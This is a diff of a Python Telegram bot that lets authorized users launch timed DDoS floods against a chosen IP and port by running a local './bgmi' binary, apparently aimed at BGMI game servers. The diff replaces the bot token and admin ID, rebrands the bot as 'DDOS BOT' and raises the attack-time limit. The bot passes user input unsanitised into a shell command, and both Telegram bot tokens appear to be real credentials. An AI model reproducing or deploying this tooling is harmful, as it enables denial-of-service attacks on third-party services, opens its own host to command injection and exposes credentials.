@@ -11,10 +11,10 @@ import os
 from keep_alive import keep_alive
 keep_alive()
 # insert your Telegram bot token here
-bot = telebot.TeleBot('7220095066:AAGQpjxk1RIxqYeryVZWyvRz7SVS_oaFBwc')
+bot = telebot.TeleBot('7117513635:AAHe80vqsLBN1MdCBx3Sk9LTQX8mkPKN_ms')
 
 # Admin user IDs
-admin_id = ["5599402910"]
+admin_id = ["5612297293"]
 
 # File to store allowed user IDs
 USER_FILE = "users.txt"
@@ -211,7 +211,7 @@ def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
-    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊2 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI\nBy STORM BOT"
+    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊2 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI\nBy DDOS BOT"
     bot.reply_to(message, response)
 
 # Dictionary to store the last time each user ran the /bgmi command
@@ -239,19 +239,19 @@ def handle_bgmi(message):
             target = command[1]
             port = int(command[2])  # Convert time to integer
             time = int(command[3])  # Convert port to integer
-            if time > 201:
+            if time > 241:
                 response = "Error: Time interval must be less than 201."
             else:
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./bgmi {target} {port} {time} 500"
+                full_command = f"./bgmi {target} {port} {time} 60"
                 subprocess.run(full_command, shell=True)
                 response = f"BGMI Attack2 Finished. Target: {target} Port: {port} Time: {time}"
         else:
-            response = "Usage :- /attack2 <target> <port> <time>\nBy STORM BOT"  # Updated command syntax
+            response = "Usage :- /attack2 <target> <port> <time>\nBy DDOS BOT"  # Updated command syntax
     else:
-        response = "You Are Not Authorized To Use This Command.\nBy STORM BOT"
+        response = "You Are Not Authorized To Use This Command.\nBy DDOS BOT"
 
     bot.reply_to(message, response)
 
